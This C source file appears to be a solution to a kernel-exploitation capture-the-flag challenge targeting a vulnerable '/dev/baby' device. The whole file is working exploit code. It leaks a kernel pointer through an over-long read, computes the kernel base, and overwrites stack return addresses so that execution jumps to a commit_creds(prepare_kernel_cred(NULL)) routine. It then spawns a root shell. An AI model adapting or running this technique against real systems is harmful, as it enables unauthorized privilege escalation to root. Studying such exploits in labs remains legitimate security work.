#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...)                                                           \
  do {                                                                         \
  } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

static inline void panic(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

u64 kBase = 0;

void setRoot() {
  void *(*prepare_kernel_cred)(void *) = (void *)(kBase + 0x861d0);
  void (*commit_creds)(void *) = (void *)(kBase + 0x85fa0);
  commit_creds(prepare_kernel_cred(NULL));
}

int main(int argc, char **argv, char **envp) {
  int devfd = open("/dev/baby", O_RDWR);
  if (devfd < 0) {
    panic("open dev");
  }
  char buf[0x500] = {0};

  read(devfd, buf, 408 + 0x40);

  u64 vfs_read_0x97 = *(u64 *)(buf + 0x198);
  kBase = vfs_read_0x97 - 0x1ca727;
  logInfo("kBase @ 0x%lx", kBase);

  *(u64 *)(buf + 0x198) = ((u64)setRoot) + 71;
  *(u64 *)(buf + 0x198 + 8) = ((u64)setRoot) + 71;
  *(u64 *)(buf + 0x198 + 0x10) = ((u64)setRoot) + 71;
  *(u64 *)(buf + 0x198 + 0x18) = ((u64)setRoot) + 71;
  *(u64 *)(buf + 0x198 + 0x20) = ((u64)setRoot) + 71;
  *(u64 *)(buf + 0x198 + 0x28) = ((u64)setRoot) + 71;
  *(u64 *)(buf + 0x198 + 0x30) = ((u64)setRoot) + 4;

  write(devfd, buf, 408 + 8 + 0x38);

  system("sh");
}